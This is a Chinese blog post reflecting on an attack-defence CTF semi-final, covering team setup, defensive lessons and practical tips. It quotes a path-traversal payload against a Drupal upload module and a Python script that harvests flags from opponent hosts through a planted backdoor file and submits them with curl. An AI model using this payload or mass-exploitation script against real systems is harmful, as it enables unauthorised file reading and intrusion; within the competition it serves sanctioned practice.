---
layout: blog
book: true
title:  "网鼎杯半决赛赛后总结"
background: green
background-image: http://ot1cc1u9t.bkt.clouddn.com/17-7-17/89166189.jpg
date:   2018-09-05 22:53:26
category: 安全
tags:
- 赛后总结 
---

# 0x01、

因为第一次参加线下赛，经验不太足，刚拿到机器时有点手忙脚乱。慢慢调整之后进入比赛状态(其实还是有点懵逼)

上去按照正常的套路,ssh连上之后直接备份代码，扔到D盾扫一下是不是有后门[没有发现明显的WebShell].然后准备上waf的时候发现权限不够....(经验问题:其实在ssh连接上之后有提示的[su apache/su pwn])

等了一会waf配置好，并没有及时的审计代码，而是坐在那里淡定的等着日志.....一分钟后，我们的web机器被打..赶紧看日志，发现了payload:

```php
/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../../../flag
```

队里面的大佬赶紧写了批量和自动提交flag脚本:

```python
import requests
import sys
import os
import time
import json
token= "15028245de14517624df881e158exxxx"
#http://172.16.x.xx:5067/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../flag
#ip = "10.16.9."
f = open("iisputlist.txt",'r')
for i in f.readlines():
    _ip = i.replace("\r\n","")
    try:
        #print _ip
        r = requests.get("http://"+ _ip +'/themes/bartik/InsecureRequestWarning.php',timeout=3)
        #print r.text
        flag=r.text
        command = "curl -k 'https://172.16.4.1/Common/awd_sub_answer' -d 'token=%s&answer=%s' -X POST" %(token,flag)
        time.sleep(3)
        os.system(command)
        print("\n")
    except:
        pass
'''
token= "15028245de14517624df881e158exxxx"
#answer = raw_input()
command = "curl -k 'https://172.16.x.x/Common/awd_sub_answer' -d 'token=%s&answer=%s' -X POST" %( token,answer)
os.system(command)
#print s
'''

```
pwn题从头到尾一直没有着落，一直处于被打的地位~web也是莫名其妙的被打(明明出现漏洞已经根据日志修复了，但是还是被草哭了)~
后来P0神提醒了一下，要求了赛方重置机器，然后再上waf修复漏洞，居然不被打了。但是pwn还是一直被打...最后想到了一个办法..
flag在系统根目录///....所以..emmmmm 改名字吧 果然三个pwn中有一个改了名字会设备异常 所以还是被打吧！保住一台是一台

# 0x02、

在比赛中还是积累了不少的经验,比如:

- 1.设备要带齐全
- 2.赛前准备的一些脚本,因为比赛的环境不联网所以尽量避免使用一些第三方库，如果真的需要使用的话，还是带上离线安装包。
- 3.心态要好，我方队员一直处于心态良好。不停地骚扰隔壁桌的小哥哥....我甚至厚颜无耻的要了一个flag...
- 4.AWD+CTF的时候..发现Nessus这些扫描系统的根本用不上，一些系统补丁，前期花了大量时间准备，发现并没有用上。
- 5.在接下来的时间里，要多多联系PWN题..得pwn者..得晋级啊...[你看今天天上的云..像不像正在做的PWN题]

	

